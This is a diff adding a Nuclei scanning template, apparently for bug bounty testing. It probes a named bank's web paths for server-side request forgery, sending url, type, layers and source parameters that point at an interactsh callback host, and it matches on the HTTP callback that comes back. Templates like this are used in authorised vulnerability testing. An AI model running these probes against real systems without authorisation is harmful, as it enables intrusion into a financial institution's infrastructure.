@@ -1,0 +1,23 @@
+id: alfabank-ssrf
+
+info:
+  name: Alfabank - SSRF via URL/Callback Parameters
+  author: bugbounty
+  severity: critical
+  description: SSRF in URL, image, callback parameters
+  tags: ssrf,alfabank
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/_/ajax/_get_user_city.html?url=http://{{interactsh-url}}/test"
+      - "{{BaseURL}}/acs/logoimage?type=http://{{interactsh-url}}/logo.png"
+      - "{{BaseURL}}/images?layers=http://{{interactsh-url}}/layer"
+      - "{{BaseURL}}/for/img?source=http://{{interactsh-url}}"
+      - "{{BaseURL}}/_next/image?url=http://{{interactsh-url}}/bot.png"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
